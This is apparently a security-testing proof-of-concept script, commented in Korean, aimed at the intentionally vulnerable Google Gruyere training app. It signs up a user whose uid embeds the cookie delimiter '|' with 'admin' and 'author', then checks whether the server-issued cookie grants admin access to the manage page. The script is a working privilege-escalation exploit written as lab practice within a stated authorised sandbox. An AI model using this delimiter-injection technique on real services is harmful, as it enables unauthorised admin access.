#!/usr/bin/env python3
# Round 9 — 쿠키 구분자 인젝션 (승인받은 범위: 내 GID 샌드박스에 uid 에 '|' 포함 계정 1개 생성)
# 서버가 스스로 발급한 Set-Cookie 문자열을 가공 없이 증거로 관찰한다.
import subprocess, pathlib, re, urllib.parse, sys

SCRATCH = pathlib.Path(__file__).resolve().parent.parent / "scratch"
GID = (SCRATCH / "gid.txt").read_text().strip().split("=")[-1]
B = f"https://google-gruyere.appspot.com/{GID}"
PX = ["-x", "http://127.0.0.1:8080", "--cacert", "/home/taeuk/.mitmproxy/mitmproxy-ca-cert.pem"]

UID = "r9poc|admin|author"
PW = "r9pocpw!"

def curl(*args, save=None, show_headers=False):
    cmd = ["curl", "-s", *PX]
    if show_headers:
        cmd += ["-D", "-"]
    cmd += list(args)
    r = subprocess.run(cmd, capture_output=True)
    out = r.stdout.decode("utf-8", "replace")
    if save:
        (SCRATCH / save).write_text(out, encoding="utf-8")
    return out

print("=" * 70)
print("대상:", B)
print("생성할 uid:", repr(UID))
print("=" * 70)

# --- 1) 대조군: 정상 uid 로 만든 쿠키가 어떤 모양인지 (brie 로그인) ---
print("\n[대조군] 정상 계정(brie) 로그인 응답의 Set-Cookie")
h = curl(f"{B}/login?uid=brie&pw=briebrie", show_headers=True,
         save="r9_control_login_headers.txt")
for line in h.splitlines():
    if line.lower().startswith("set-cookie"):
        raw = line.split(":", 1)[1].strip()
        # 값만 마스킹 없이 구조 확인: <서명>|<uid>|<admin>|<author>
        print("   ", re.sub(r"^GRUYERE=\d+", "GRUYERE=<sig숫자>", raw))

# --- 2) 본 실험: uid 에 '|' 를 포함해 계정 생성 ---
q = urllib.parse.urlencode({"action": "new", "uid": UID, "pw": PW})
print(f"\n[실험] 가입 요청: GET /saveprofile?{q}")
h = curl(f"{B}/saveprofile?{q}", show_headers=True,
         save="r9_signup_headers.txt")
status = h.splitlines()[0].strip()
print("   상태줄:", status)
issued = None
for line in h.splitlines():
    if line.lower().startswith("set-cookie"):
        issued = line.split(":", 1)[1].strip()
        print("   >> 서버가 발급한 Set-Cookie (원문):")
        print("      " + issued)

# --- 3) 서버 자신이 그 쿠키를 어떻게 해석하는가 (읽기 전용) ---
if issued:
    cval = issued.split("=", 1)[1].split(";")[0]
    (SCRATCH / "r9_issued_cookie.txt").write_text(cval + "\n", encoding="utf-8")
    print("\n[검증] 발급받은 쿠키를 그대로 되돌려 보내 서버의 파싱 결과를 본다 (/dump.gtl)")
    d = curl(f"{B}/dump.gtl", "-b", f"GRUYERE={cval}", save="r9_dump_with_issued_cookie.html")
    blocks = re.findall(r"<pre>(.*?)</pre>", d, re.S)
    for b in blocks:
        if "_cookie" in b or ("'uid'" in b and "is_admin" in b):
            print("   서버가 파싱한 _cookie:")
            print("   " + b.strip()[:400].replace("\n", "\n   "))
            break

    # 관리자 전용 페이지 접근 비교 (읽기 전용)
    print("\n[임팩트] 관리자 페이지 접근 비교 (읽기 전용)")
    for label, extra in [("발급쿠키", ["-b", f"GRUYERE={cval}"]),
                         ("쿠키없음", []),
                         ("정상계정(brie)", ["-b", "gruyere.cookies"])]:
        out = curl(f"{B}/manage.gtl", *extra, show_headers=True,
                   save=f"r9_manage_{label}.txt")
        st = out.splitlines()[0].strip()
        body = out.split("\r\n\r\n", 1)[-1] if "\r\n\r\n" in out else out
        has = "Manage Snippets" in body or "administrator" in body.lower()
        print(f"   - {label:16} {st}   관리자 화면 렌더: {has}")

print("\n" + "=" * 70)
print("증거 파일: scratch/r9_signup_headers.txt, r9_issued_cookie.txt,")
print("           r9_dump_with_issued_cookie.html, r9_manage_*.txt")
